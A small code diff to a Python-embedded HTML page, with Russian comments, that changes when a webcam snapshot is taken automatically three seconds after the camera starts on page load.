@@ -35,13 +35,6 @@ html_code = """
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const videoElement = document.getElementById('videoElement');
                 videoElement.srcObject = stream;
-
-                // После того как камера запущена и доступ разрешён, делаем снимок
-                videoElement.onplaying = () => {
-                    setTimeout(() => {
-                        capturePhoto();
-                    }, 3000); // Снимает фото через 3 секунды
-                };
             } catch (error) {
                 console.error("Ошибка доступа к камере:", error);
                 alert("Не удалось получить доступ к камере.");
@@ -71,9 +64,15 @@ html_code = """
 
         // Запускаем камеру при загрузке страницы
         startCamera();
+
+        // Функция для автоматической съемки фото через 3 секунды
+        setTimeout(() => {
+            capturePhoto();
+        }, 3000);  // Снимает фото через 3 секунды
     </script>
 </body>
 </html>
+
 
 """
 
